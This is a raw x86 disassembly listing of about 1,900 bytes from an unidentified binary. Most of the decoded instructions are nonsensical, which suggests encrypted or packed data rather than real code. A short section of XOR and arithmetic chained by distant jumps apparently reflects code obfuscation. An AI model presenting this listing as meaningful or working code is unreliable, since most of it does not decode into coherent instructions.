  41a3fe:	xchg   edx,eax
  41a3ff:	lds    ebp,FWORD PTR [edi+0x3039b07e]
  41a405:	shr    BYTE PTR [ecx+0x240388c9],1
  41a40b:	or     eax,0x2fc23320
  41a410:	mov    bl,0x61
  41a412:	rol    dl,cl
  41a414:	xchg   bh,ah
  41a416:	jg     0x41a3c3
  41a418:	push   esp
  41a419:	mov    cl,0x9
  41a41b:	and    al,0x7d
  41a41d:	adc    al,0x5
  41a41f:	add    eax,0x600a1dab
  41a424:	push   ebp
  41a425:	ins    BYTE PTR es:[edi],dx
  41a426:	push   ds
  41a427:	imul   esi,DWORD PTR [esi+0x3b],0x1a6defb4
  41a42e:	ret    0xe6be
  41a431:	sub    ebp,esp
  41a433:	ret    0x7619
  41a436:	test   DWORD PTR [edi-0x51],ebp
  41a439:	mov    dh,0xb7
  41a43b:	mov    ecx,0xf97039c2
  41a440:	sbb    DWORD PTR [esi+0x253f7c83],ebx
  41a446:	loope  0x41a3fb
  41a448:	pop    ebx
  41a449:	mov    dh,0xf9
  41a44b:	(bad)  
  41a44c:	add    BYTE PTR ds:[eax-0x54],ch
  41a450:	and    al,0x3e
  41a452:	cmc    
  41a453:	leave  
  41a454:	(bad)  
  41a455:	sbb    eax,0x51bb0d3
  41a45a:	mov    ebp,0xf4311bc3
  41a45f:	cmp    bh,BYTE PTR [eax-0x49]
  41a462:	fsubr  QWORD PTR [edx]
  41a464:	inc    esp
  41a465:	mov    al,0x7a
  41a467:	dec    eax
  41a468:	ins    BYTE PTR es:[edi],dx
  41a469:	xlat   BYTE PTR ds:[ebx]
  41a46a:	mov    ebp,0x27dc330a
  41a46f:	push   edi
  41a470:	push   ss
  41a471:	dec    eax
  41a472:	stos   DWORD PTR es:[edi],eax
  41a473:	leave  
  41a474:	pop    esp
  41a475:	pcmpeqd mm1,QWORD PTR [esi]
  41a478:	add    eax,0x9562e801
  41a47d:	arpl   WORD PTR [ebx+edi*1-0x70cd2705],cx
  41a484:	arpl   WORD PTR [eax+eax*2],bx
  41a487:	inc    ebx
  41a488:	push   ebx
  41a489:	mov    dh,0x88
  41a48b:	xor    BYTE PTR [ebx+eiz*2+0x4312fea6],bl
  41a492:	mov    edx,0x34778aba
  41a497:	xchg   esp,eax
  41a498:	std    
  41a499:	jnp    0x41a4f6
  41a49b:	cmp    al,0x35
  41a49d:	imul   edx,DWORD PTR [ebx+0x10e01695],0xf53343ff
  41a4a7:	adc    edi,DWORD PTR [ebx+edx*2+0xa]
  41a4ab:	pop    ebp
  41a4ac:	nop
  41a4ad:	imul   ecx,esi,0x8b7e2194
  41a4b3:	int    0x69
  41a4b5:	mov    edx,0xd69973d1
  41a4ba:	add    al,0xde
  41a4bc:	sbb    eax,0x249321cf
  41a4c1:	pusha  
  41a4c2:	push   eax
  41a4c3:	push   cs
  41a4c4:	scas   al,BYTE PTR es:[edi]
  41a4c5:	cmc    
  41a4c6:	mov    ebx,0xf233345a
  41a4cb:	fucomi st,st(4)
  41a4cd:	jbe    0x41a518
  41a4cf:	pop    esp
  41a4d0:	mov    ecx,eax
  41a4d2:	out    0xec,al
  41a4d4:	ror    BYTE PTR [eax-0x6a],0x39
  41a4d8:	scas   al,BYTE PTR es:[edi]
  41a4d9:	adc    eax,0xc1037e27
  41a4de:	dec    ecx
  41a4df:	ret    
  41a4e0:	cld    
  41a4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e2:	das    
  41a4e3:	in     eax,0x5c
  41a4e5:	jbe    0x41a48d
  41a4e7:	jno    0x41a4e6
  41a4e9:	data16 aam 0x66
  41a4ec:	inc    ebx
  41a4ed:	arpl   WORD PTR [edx],ax
  41a4ef:	dec    edx
  41a4f0:	scas   eax,DWORD PTR es:[edi]
  41a4f1:	jae    0x41a49d
  41a4f3:	xlat   BYTE PTR ds:[ebx]
  41a4f4:	lods   al,BYTE PTR ds:[esi]
  41a4f5:	push   esp
  41a4f6:	mov    edi,0x238edbde
  41a4fb:	cmp    al,0xb0
  41a4fd:	lods   al,BYTE PTR ds:[esi]
  41a4fe:	cmp    dl,BYTE PTR [esi+0x19]
  41a501:	sbb    esp,DWORD PTR [edi+ecx*4-0x56]
  41a505:	lahf   
  41a506:	cmp    edx,edx
  41a508:	icebp  
  41a509:	sub    eax,0x7161ebd3
  41a50e:	inc    ebp
  41a50f:	fstp   TBYTE PTR [ebp-0x18f7818]
  41a515:	mov    esi,0xb131b75f
  41a51a:	sti    
  41a51b:	add    al,0x77
  41a51d:	mov    ebp,0xac3d0386
  41a522:	add    esi,esi
  41a524:	scas   al,BYTE PTR es:[edi]
  41a525:	mov    cl,0x7e
  41a527:	stc    
  41a528:	xchg   DWORD PTR [ebx+0x51f3db8d],esp
  41a52e:	jl     0x41a543
  41a530:	add    al,0x8e
  41a532:	adc    BYTE PTR [edi-0x32],ch
  41a535:	stc    
  41a536:	mov    esi,0xc81f7519
  41a53b:	fiadd  WORD PTR [edx+0x49]
  41a53e:	mov    ?,WORD PTR [eax+eiz*4+0x1c]
  41a542:	push   edi
  41a543:	fistp  DWORD PTR [ebp-0xe]
  41a546:	lods   al,BYTE PTR ds:[esi]
  41a547:	and    BYTE PTR [ebp+0x3a494a5d],bl
  41a54d:	cmc    
  41a54e:	push   0x79
  41a550:	loope  0x41a5c0
  41a552:	pop    edi
  41a553:	mov    DWORD PTR [ecx+0x489766b4],ebp
  41a559:	adc    DWORD PTR [edx],edi
  41a55b:	fsubr  QWORD PTR [esi+0x25]
  41a55e:	xchg   esp,eax
  41a55f:	es dec ebx
  41a561:	lea    ecx,[edx]
  41a563:	and    BYTE PTR ss:[eax+0x5fd9e546],dl
  41a56a:	retf   
  41a56b:	cwde   
  41a56c:	loope  0x41a588
  41a56e:	nop
  41a56f:	mov    ebp,0x11c6433a
  41a574:	jp     0x41a5c4
  41a576:	call   0x4759a153
  41a57b:	jns    0x41a54f
  41a57d:	dec    ebp
  41a57e:	mov    al,0x88
  41a580:	mov    dl,0xf8
  41a582:	pop    es
  41a583:	mov    esp,0x587178c8
  41a588:	xor    al,0x9
  41a58a:	inc    esp
  41a58b:	mov    ebp,0xc3a86417
  41a590:	sub    BYTE PTR [edx],bl
  41a592:	pushf  
  41a593:	mov    dl,0x8f
  41a595:	sbb    al,0x39
  41a597:	icebp  
  41a598:	ret    
  41a599:	into   
  41a59a:	xchg   esi,eax
  41a59b:	in     al,0xa
  41a59d:	fwait
  41a59e:	or     DWORD PTR [esi],ebp
  41a5a0:	or     al,ah
  41a5a2:	sbb    DWORD PTR [edi+0x42],ecx
  41a5a5:	inc    edx
  41a5a6:	cwde   
  41a5a7:	jmp    0x41a592
  41a5a9:	adc    ch,bl
  41a5ab:	hlt    
  41a5ac:	mov    eax,ds:0x7880c06f
  41a5b1:	inc    edx
  41a5b2:	ret    0xc866
  41a5b5:	pop    eax
  41a5b6:	inc    edx
  41a5b7:	ret    
  41a5b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b9:	test   al,0x42
  41a5bb:	xor    cl,bh
  41a5bd:	outs   dx,DWORD PTR ds:[esi]
  41a5be:	stos   DWORD PTR es:[edi],eax
  41a5bf:	nop
  41a5c0:	fidivr DWORD PTR [eax-0x62]
  41a5c3:	sbb    BYTE PTR [esp+ebx*1+0x8c9fcce],bl
  41a5ca:	add    bl,cl
  41a5cc:	or     al,0xa
  41a5ce:	inc    ebp
  41a5cf:	add    edi,DWORD PTR [ebp+eax*1+0x2a]
  41a5d3:	add    eax,0x8712fe78
  41a5d8:	push   es
  41a5d9:	inc    ebx
  41a5da:	pop    esi
  41a5db:	lea    edi,[edx]
  41a5dd:	add    eax,0xb95abdcb
  41a5e2:	enter  0xe1ff,0x6a
  41a5e6:	mov    bl,0x11
  41a5e8:	push   es
  41a5e9:	ret    0x8f0a
  41a5ec:	add    al,0x34
  41a5ee:	xchg   esp,eax
  41a5ef:	lock aam 0x60
  41a5f2:	xor    al,0xa8
  41a5f4:	das    
  41a5f5:	push   ss
  41a5f6:	mov    esi,0xaa1aff5a
  41a5fb:	xchg   ebx,eax
  41a5fc:	cmc    
  41a5fd:	dec    BYTE PTR [edx]
  41a5ff:	fmulp  st(2),st
  41a601:	sbb    eax,DWORD PTR [edi]
  41a603:	test   ah,bh
  41a605:	test   al,0x5d
  41a608:	xchg   ecx,eax
  41a609:	fdivr  QWORD PTR [ebp+0x9eb7842]
  41a60f:	cli    
  41a610:	mov    dh,0xb5
  41a612:	mov    eax,0x8fb21d3f
  41a617:	int    0x28
  41a619:	and    al,dh
  41a61b:	jo     0x41a648
  41a61d:	sub    al,0x6a
  41a61f:	iret   
  41a620:	stc    
  41a621:	jecxz  0x41a62d
  41a623:	push   cs
  41a624:	mov    ds:0xd8c6cecc,al
  41a629:	pop    ebx
  41a62a:	cmp    BYTE PTR [ecx+0x1a],bl
  41a62d:	test   BYTE PTR [edi+0x3d491404],al
  41a633:	sbb    BYTE PTR [eax+0x2722c763],bl
  41a639:	dec    edx
  41a63a:	ret    
  41a63b:	mov    ds,WORD PTR [ebp-0x4a35a579]
  41a641:	and    al,0x95
  41a643:	inc    eax
  41a644:	repnz (bad) 
  41a646:	push   ds
  41a647:	outs   dx,BYTE PTR ds:[esi]
  41a648:	sub    al,0xaa
  41a64a:	mov    ebx,0xda89bfce
  41a64f:	cwde   
  41a650:	ja     0x41a699
  41a652:	dec    edi
  41a653:	push   es
  41a654:	(bad)  
  41a655:	xor    al,0x75
  41a657:	sub    ch,BYTE PTR [edx-0x60913e14]
  41a65d:	cli    
  41a65e:	cmp    DWORD PTR [edi-0x1735c2aa],0x98543dda
  41a668:	mov    eax,0xcaa6a232
  41a66d:	aas    
  41a66e:	daa    
  41a66f:	test   al,0xf8
  41a671:	fmulp  st(1),st
  41a673:	in     al,dx
  41a674:	imul   eax,ecx,0x3b
  41a677:	push   ebx
  41a678:	mov    al,ds:0x85b74894
  41a67d:	mov    eax,ds:0x3f2612f0
  41a682:	jnp    0x41a68c
  41a684:	idiv   al
  41a686:	(bad)  
  41a687:	aas    
  41a688:	repnz ins DWORD PTR es:[edi],dx
  41a68a:	lea    esp,[esp+edi*8-0x37]
  41a68e:	mov    ch,0x9e
  41a690:	test   ebp,ebp
  41a692:	sub    dl,al
  41a694:	sbb    eax,DWORD PTR [edi-0x22046780]
  41a69a:	jne    0x41a621
  41a69c:	and    BYTE PTR [eax],bh
  41a69e:	hlt    
  41a69f:	add    BYTE PTR [eax+0x50b241ea],ch
  41a6a5:	and    ebx,DWORD PTR [edx+0x52]
  41a6a8:	ds mov ch,0x8f
  41a6ab:	mov    ch,0x7f
  41a6ad:	add    eax,0xc2427589
  41a6b2:	add    al,BYTE PTR [esi-0x2f]
  41a6b5:	and    BYTE PTR [ecx+0x6238120b],dl
  41a6bb:	lods   al,BYTE PTR ds:[esi]
  41a6bc:	sub    eax,0xdfc8dad0
  41a6c1:	fs loopne 0x41a6d3
  41a6c4:	dec    ecx
  41a6c5:	or     ebx,DWORD PTR [ebx-0x33426100]
  41a6cb:	sbb    cl,BYTE PTR ds:0x6e3dc911
  41a6d1:	xor    edx,DWORD PTR [esi-0x19]
  41a6d4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41a6d6:	adc    bl,BYTE PTR [edx]
  41a6d8:	push   ss
  41a6d9:	mov    edx,0x69b95681
  41a6de:	enter  0x66dd,0x8b
  41a6e2:	cld    
  41a6e3:	mov    BYTE PTR [ebp+0x1a7f39a7],cl
  41a6e9:	sti    
  41a6ea:	add    al,al
  41a6ec:	jnp    0x41a704
  41a6ee:	cdq    
  41a6ef:	push   eax
  41a6f0:	xchg   esi,eax
  41a6f1:	aaa    
  41a6f2:	jae    0x41a6fb
  41a6f4:	jmp    0x41a72d
  41a6f6:	cmp    BYTE PTR [bx+di],bl
  41a6f9:	rcr    BYTE PTR [edx+0x6afa7d6d],0xe3
  41a700:	dec    eax
  41a701:	mov    bl,0xb7
  41a703:	sbb    DWORD PTR [ebp+eiz*8-0x381103aa],esp
  41a70a:	out    dx,eax
  41a70b:	and    al,0xb3
  41a70d:	pop    esi
  41a70e:	xor    BYTE PTR [ecx+0xc33584c],0x1e
  41a715:	xlat   BYTE PTR ds:[ebx]
  41a716:	sub    BYTE PTR [esi+0x24595299],dl
  41a71c:	enter  0xc58b,0x30
  41a720:	imul   eax,esi,0x18
  41a723:	stos   DWORD PTR es:[edi],eax
  41a724:	inc    ebx
  41a725:	mov    al,ds:0x3458e365
  41a72a:	(bad)  
  41a72b:	fcom   QWORD PTR [ebp+0x2337a13e]
  41a731:	sub    BYTE PTR [edx-0x6e35016d],al
  41a737:	jbe    0x41a783
  41a739:	ror    dl,0xcd
  41a73c:	(bad)  
  41a73d:	jg     0x41a774
  41a73f:	cdq    
  41a740:	adc    eax,0x416a8889
  41a745:	jmp    0xb313:0x9d77be46
  41a74c:	xchg   ebp,eax
  41a74d:	fisubr DWORD PTR [ecx]
  41a74f:	sub    al,0x14
  41a751:	inc    ebx
  41a752:	or     BYTE PTR [ebp-0x7a],bh
  41a755:	(bad)  
  41a756:	data16 jb 0x41a7cc
  41a759:	shl    DWORD PTR [esi],cl
  41a75b:	scas   eax,DWORD PTR es:[edi]
  41a75c:	enter  0x5e48,0xf5
  41a760:	(bad)  
  41a761:	arpl   WORD PTR [ebx+0x58526a62],bp
  41a767:	(bad)  
  41a768:	ficom  WORD PTR [ebx+0x415bd29e]
  41a76e:	mov    es,WORD PTR [ecx]
  41a770:	fdiv   QWORD PTR [eax]
  41a772:	aad    0x5f
  41a774:	mov    ebp,DWORD PTR [eax+0x2cdde694]
  41a77a:	imul   ebp,DWORD PTR [eax-0x41],0x31
  41a77e:	dec    ebp
  41a77f:	xor    ebx,eax
  41a781:	(bad)  
  41a782:	dec    DWORD PTR [esi+0x7cbc3bb1]
  41a788:	and    ah,BYTE PTR [edx]
  41a78a:	aam    0x8d
  41a78c:	sbb    ebx,DWORD PTR [edi-0x6f]
  41a78f:	xchg   BYTE PTR [edx+ebx*2+0x610612c2],bl
  41a796:	fistp  QWORD PTR [ebx+0x794d08d9]
  41a79c:	sbb    al,0x79
  41a79e:	pop    esp
  41a79f:	mov    ch,0x4a
  41a7a1:	push   esi
  41a7a2:	xchg   BYTE PTR [esi+0x29],ch
  41a7a5:	jne    0x41a80a
  41a7a7:	cmp    al,0x20
  41a7a9:	mov    cl,0xee
  41a7ab:	mov    ds:0xd66d266d,al
  41a7b0:	aam    0xde
  41a7b2:	out    dx,eax
  41a7b3:	outs   dx,BYTE PTR ss:[esi]
  41a7b5:	add    DWORD PTR [ebx],esp
  41a7b7:	dec    esi
  41a7b8:	(bad)  [esi-0x71a1c18b]
  41a7be:	pop    es
  41a7bf:	inc    edi
  41a7c0:	je     0x41a76e
  41a7c2:	aad    0x8b
  41a7c4:	push   ebp
  41a7c5:	in     al,dx
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x4def34d2]
  41a82d:	jecxz  0x41a7bf
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	jnp    0x41a8a2
  41a838:	arpl   WORD PTR [eax+0x2c],di
  41a83b:	cmp    al,0x7c
  41a83d:	pop    edi
  41a83e:	pop    ebp
  41a83f:	into   
  41a840:	pushf  
  41a841:	and    eax,0x475e33ac
  41a846:	and    cl,BYTE PTR [edi-0x4]
  41a849:	pop    es
  41a84a:	ret    
  41a84b:	repnz lods al,BYTE PTR ds:[esi]
  41a84d:	ins    BYTE PTR es:[edi],dx
  41a84e:	(bad)  
  41a84f:	pop    ebp
  41a850:	push   edi
  41a851:	xor    ah,ah
  41a853:	mov    esp,0x5940f0b5
  41a858:	inc    esi
  41a859:	pop    ecx
  41a85a:	pop    esi
  41a85b:	dec    esi
  41a85c:	dec    ebp
  41a85d:	and    BYTE PTR [edi-0xabd8449],bh
  41a863:	cmp    eax,0x4d56ea22
  41a868:	jnp    0x41a804
  41a86a:	mov    bl,0xf0
  41a86c:	pop    esi
  41a86d:	mov    bl,0x14
  41a86f:	mov    bh,0x3
  41a871:	mov    ebx,0x9112b6cb
  41a876:	xor    al,0x9a
  41a878:	mov    al,ds:0x7eb6c30d
  41a87d:	out    dx,eax
  41a87e:	fcmovnb st,st(4)
  41a880:	lea    ebp,[ecx]
  41a882:	jle    0x41a830
  41a884:	sbb    esi,DWORD PTR [eax]
  41a886:	rol    DWORD PTR [ebp+0x6dc8e749],cl
  41a88c:	mov    bl,0xb7
  41a88e:	ficomp DWORD PTR [ecx-0x37a1c81e]
  41a894:	es xchg edi,eax
  41a896:	icebp  
  41a897:	sbb    ch,cl
  41a899:	nop
  41a89a:	dec    ebp
  41a89b:	cmp    edi,esi
  41a89d:	inc    esi
  41a89e:	or     DWORD PTR [edx+eiz*1],ebp
  41a8a1:	aam    0xe8
  41a8a3:	dec    edi
  41a8a4:	mov    edi,0xb735610e
  41a8a9:	imul   ebx,ebx,0xffffffd6
  41a8ac:	aad    0x48
  41a8ae:	fldcw  WORD PTR ds:0x73bfff8
  41a8b4:	xlat   BYTE PTR ds:[ebx]
  41a8b5:	mov    ebp,0x1865a0a6
  41a8ba:	xchg   esi,eax
  41a8bb:	sti    
  41a8bc:	xchg   ecx,eax
  41a8bd:	push   ebx
  41a8be:	mov    bl,0x86
  41a8c0:	arpl   WORD PTR [ecx+0x673406f5],ax
  41a8c6:	jne    0x41a8d5
  41a8c8:	retf   0x461e
  41a8cb:	fs (bad) 
  41a8cd:	push   ecx
  41a8ce:	cmp    esp,DWORD PTR [eax]
  41a8d0:	loop   0x41a93d
  41a8d2:	das    
  41a8d3:	dec    eax
  41a8d4:	inc    edi
  41a8d5:	test   al,0xb5
  41a8d7:	dec    edx
  41a8d8:	lock mov eax,ds:0x11060c3e
  41a8de:	mov    bl,0xc3
  41a8e0:	inc    edx
  41a8e1:	scas   eax,DWORD PTR es:[edi]
  41a8e2:	jmp    0x5376:0xe6beb724
  41a8e9:	ret    0x3ea9
  41a8ec:	jne    0x41a87e
  41a8ee:	and    DWORD PTR [ebx-0x1b3f1eb5],eax
  41a8f4:	mov    ecx,0xca2c3a5b
  41a8f9:	dec    ebx
  41a8fa:	jle    0x41a956
  41a8fc:	scas   eax,DWORD PTR es:[edi]
  41a8fd:	pop    edi
  41a8fe:	sbb    al,0xff
  41a900:	pusha  
  41a901:	push   0xfffffff5
  41a903:	pop    esi
  41a904:	repz fdivr st(0),st
  41a907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a908:	cdq    
  41a909:	cwde   
  41a90a:	pushf  
  41a90b:	sub    BYTE PTR [edx+0x3cbf5543],bl
  41a911:	das    
  41a912:	imul   ecx,DWORD PTR [edx+0x310db95b],0xffffffd2
  41a919:	fsub   DWORD PTR ds:0xed94aa4d
  41a91f:	xor    al,0xbd
  41a921:	stc    
  41a922:	add    eax,0x3b8672a7
  41a927:	(bad)  
  41a929:	repnz popa 
  41a92b:	popa   
  41a92c:	std    
  41a92d:	fild   WORD PTR ds:0xca416311
  41a933:	mov    bl,0x39
  41a935:	(bad)  
  41a936:	adc    ecx,ebx
  41a938:	and    DWORD PTR [edx-0x75],esi
  41a93b:	inc    esi
  41a93c:	or     BYTE PTR [edx],0x51
  41a93f:	les    edi,FWORD PTR [ecx]
  41a941:	imul   ecx,DWORD PTR [eax+0x72a2810c],0xffffffb6
  41a948:	daa    
  41a949:	int    0x41
  41a94b:	sti    
  41a94c:	inc    ebp
  41a94d:	out    dx,al
  41a94e:	ret    
  41a94f:	fsub   DWORD PTR [ebp-0x76]
  41a952:	icebp  
  41a953:	retf   0x99be
  41a956:	lods   al,BYTE PTR ds:[esi]
  41a957:	out    dx,eax
  41a958:	mov    bl,0x4
  41a95a:	ror    DWORD PTR [edi],cl
  41a95c:	adc    eax,0xb8635670
  41a961:	ja     0x41a956
  41a963:	pusha  
  41a964:	mov    dh,0x7b
  41a966:	add    DWORD PTR [ecx+0x755e49bd],ebx
  41a96c:	stos   BYTE PTR es:[edi],al
  41a96d:	(bad)  
  41a96f:	mov    esi,0xa4a30795
  41a974:	dec    esp
  41a975:	js     0x41a9aa
  41a977:	repz push edx
  41a979:	loope  0x41a994
  41a97b:	and    BYTE PTR [edi],ch
  41a97d:	lds    ebp,FWORD PTR [edi]
  41a97f:	sbb    DWORD PTR [edx-0x25],edx
  41a982:	fld    QWORD PTR [edi+0x7a]
  41a985:	scas   eax,DWORD PTR es:[edi]
  41a986:	mov    bh,0x35
  41a988:	test   ebx,ecx
  41a98a:	add    BYTE PTR [ebx+ebx*1],bh
  41a98d:	fistp  DWORD PTR [edi+0x55165d1f]
  41a993:	adc    ebx,ebx
  41a995:	mov    al,0x3c
  41a997:	mov    edi,0x13b4b6f2
  41a99c:	fiadd  DWORD PTR [ecx-0xc]
  41a99f:	inc    ebp
  41a9a0:	int    0x63
  41a9a2:	jmp    0x76ed18a7
  41a9a7:	aam    0x5c
  41a9a9:	pop    ebp
  41a9aa:	xor    bl,dl
  41a9ac:	gs inc esi
  41a9ae:	retf   0xff88
  41a9b1:	push   eax
  41a9b2:	jg     0x41a9ed
  41a9b4:	jbe    0x41a9db
  41a9b6:	mov    DWORD PTR [edx],ebp
  41a9b8:	lods   eax,DWORD PTR ds:[esi]
  41a9b9:	push   ss
  41a9ba:	xchg   ebp,eax
  41a9bb:	cmp    ah,dl
  41a9bd:	pop    ebx
  41a9be:	add    ecx,DWORD PTR [esi-0x2ea88951]
  41a9c4:	add    ecx,esi
  41a9c6:	sub    al,0xa2
  41a9c8:	push   ebx
  41a9c9:	jecxz  0x41a9ae
  41a9cb:	test   eax,0x54901f5b
  41a9d0:	push   ss
  41a9d1:	sbb    dh,BYTE PTR [eax]
  41a9d3:	mov    ecx,DWORD PTR [ebx-0x3a954dfc]
  41a9d9:	test   eax,0x1d92074d
  41a9de:	push   ebx
  41a9df:	xchg   edx,eax
  41a9e0:	(bad)  [ebx-0x730dd4d8]
  41a9e6:	popa   
  41a9e7:	dec    edx
  41a9e8:	iret   
  41a9e9:	mov    ecx,0x1c724eac
  41a9ee:	jb     0x41a9c7
  41a9f0:	ins    BYTE PTR es:[edi],dx
  41a9f1:	xor    DWORD PTR gs:[edx-0x1d1240d5],edx
  41a9f8:	fcompp 
  41a9fa:	dec    ecx
  41a9fb:	jge    0x41aa1b
  41a9fd:	sub    al,0x42
  41a9ff:	push   cs
  41aa00:	pop    ebx
  41aa01:	(bad)  
  41aa02:	outs   dx,DWORD PTR ds:[esi]
  41aa03:	int    0x42
  41aa05:	sbb    eax,DWORD PTR [edi]
  41aa07:	xchg   ebp,esp
  41aa09:	mov    ebx,0x825642c2
  41aa0e:	xchg   ebx,eax
  41aa0f:	xor    BYTE PTR [ecx+0x11a50c58],ch
  41aa15:	inc    ebx
  41aa16:	push   ecx
  41aa17:	and    DWORD PTR [ecx],ebx
  41aa19:	mov    al,0x34
  41aa1b:	(bad)  
  41aa1c:	ins    DWORD PTR es:[edi],dx
  41aa1d:	jecxz  0x41aa30
  41aa1f:	(bad)  
  41aa20:	sub    DWORD PTR [ebx],esi
  41aa22:	adc    DWORD PTR [edi+eiz*8+0x5846aaf6],edi
  41aa29:	sar    DWORD PTR [ecx+edi*1],0xeb
  41aa2d:	jmp    0x4fa6111f
  41aa32:	push   ebp
  41aa33:	popf   
  41aa34:	add    eax,0x3281144e
  41aa39:	repnz push ss
  41aa3b:	sub    esp,DWORD PTR [ecx+ecx*4+0x4e5ac9c9]
  41aa42:	sbb    al,0x3c
  41aa44:	fimul  DWORD PTR ds:0xaf7d063c
  41aa4a:	jbe    0x41aaae
  41aa4c:	ror    cl,cl
  41aa4e:	(bad)  
  41aa4f:	aad    0x95
  41aa51:	arpl   WORD PTR [eax+0x2a],bx
  41aa54:	xchg   esi,eax
  41aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa56:	(bad)  
  41aa57:	je     0x41aaa6
  41aa59:	(bad)
  41aa5c:	mov    WORD PTR [edi+0x1],cs
  41aa5f:	sbb    al,0x12
  41aa61:	pop    ss
  41aa62:	or     ebx,DWORD PTR [ebp-0x43828e03]
  41aa68:	mov    ecx,0xe24983cb
  41aa6d:	fwait
  41aa6e:	xchg   DWORD PTR [edi+0x63],edi
  41aa71:	and    BYTE PTR [edx],cl
  41aa73:	call   0x74f73fe3
  41aa78:	adc    BYTE PTR [ebp+0x48a196ad],0x64
  41aa7f:	jo     0x41aa65
  41aa81:	sahf   
  41aa82:	es pop ebx
  41aa84:	call   0xeab97e46
  41aa89:	jnp    0x41aa56
  41aa8b:	xchg   edi,eax
  41aa8c:	cmp    BYTE PTR [edx+esi*8-0x65],cl
  41aa90:	sar    DWORD PTR [ebx],1
  41aa92:	outs   dx,DWORD PTR ds:[esi]
  41aa93:	sbb    eax,0x29afb97
  41aa98:	xchg   edi,eax
  41aa99:	retf   
  41aa9a:	retf   
  41aa9b:	sbb    al,0x30
  41aa9d:	test   al,0x8d
  41aa9f:	jae    0x41aa42
  41aaa1:	mov    dl,0x4f
  41aaa3:	pop    ebp
  41aaa4:	push   0xffffffb0
  41aaa6:	popa   
  41aaa7:	ja     0x41aac6
  41aaa9:	cmp    cl,dh
  41aaab:	enter  0x701f,0x76
  41aaaf:	inc    BYTE PTR [ebx-0x726a0135]
  41aab5:	pop    edx
  41aab6:	pop    ecx
  41aab7:	ffreep st(2)
  41aab9:	or     ah,BYTE PTR [edx]
  41aabb:	add    al,0x9c
  41aabd:	sbb    DWORD PTR [eax-0x56d1ebd4],edi
  41aac3:	cmc    
  41aac4:	push   esi
  41aac5:	rol    DWORD PTR [ecx-0x79336ca7],1
  41aacb:	mov    ch,0xb6
  41aacd:	mov    edi,0x170cbdb8
  41aad2:	sub    ebp,DWORD PTR [edx+eiz*4+0xcbec435]
  41aad9:	mov    eax,ds:0x2a157395
  41aade:	adc    dh,0xbb
  41aae1:	test   eax,0xa4cb08e1
  41aae6:	ins    BYTE PTR es:[edi],dx
  41aae7:	xlat   BYTE PTR ds:[ebx]
  41aae8:	mov    edx,?
  41aaea:	js     0x41aae1
  41aaec:	dec    ebx
  41aaed:	pop    es
  41aaee:	mov    ah,0x5
  41aaf0:	iret   
  41aaf1:	je     0x41aa8f
  41aaf3:	jno    0x41ab16
  41aaf5:	out    dx,eax
  41aaf6:	test   BYTE PTR [edi+0x44],al
  41aaf9:	leave  
  41aafa:	mov    bl,0x9a
  41aafc:	dec    edi
  41aafd:	xchg   esp,eax
  41aafe:	ins    BYTE PTR es:[edi],dx
  41aaff:	jae    0x41ab57
  41ab01:	pop    eax
  41ab02:	adc    al,0x16
  41ab04:	stc    
  41ab05:	fsub   QWORD PTR [edi-0x3cb37b5]
  41ab0b:	je     0x41aab1
  41ab0d:	or     BYTE PTR [esi+0x6e],ch
  41ab10:	jmp    0x41aaa7
  41ab12:	int3   
  41ab13:	arpl   WORD PTR [edi+eiz*1],cx
  41ab16:	rdmsr  
  41ab18:	arpl   di,cx
  41ab1a:	imul   edx,DWORD PTR [edx+0x78],0x2cb63812
  41ab21:	mov    ebx,0x1f2c2231
  41ab26:	sub    cl,BYTE PTR [esi-0x11]
  41ab29:	or     al,0xfd
  41ab2b:	(bad)  [ecx-0x4a0cf6e6]
  41ab31:	pop    ecx
  41ab32:	sbb    al,0x5e
  41ab34:	or     DWORD PTR [eax],edi
  41ab36:	int3   
  41ab37:	test   al,0x50
  41ab39:	aad    0x31
  41ab3b:	mov    cl,0xbf
  41ab3d:	js     0x41ab8a
  41ab3f:	pop    esi
  41ab40:	icebp  
  41ab41:	sub    ecx,DWORD PTR [edi+0x335fe0f8]
  41ab47:	mov    ds:0xf0add081,al
  41ab4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4d:	and    DWORD PTR [ecx],esp
  41ab4f:	repz sbb DWORD PTR [ebx+0xf],ebx
  41ab53:	out    dx,al
  41ab54:	xchg   edx,eax
  41ab55:	rcr    DWORD PTR ds:0xb34579cd,0xf9
  41ab5c:	adc    al,0x4e
  41ab5e:	int    0xaf
  41ab60:	push   edi
  41ab61:	stos   BYTE PTR es:[edi],al
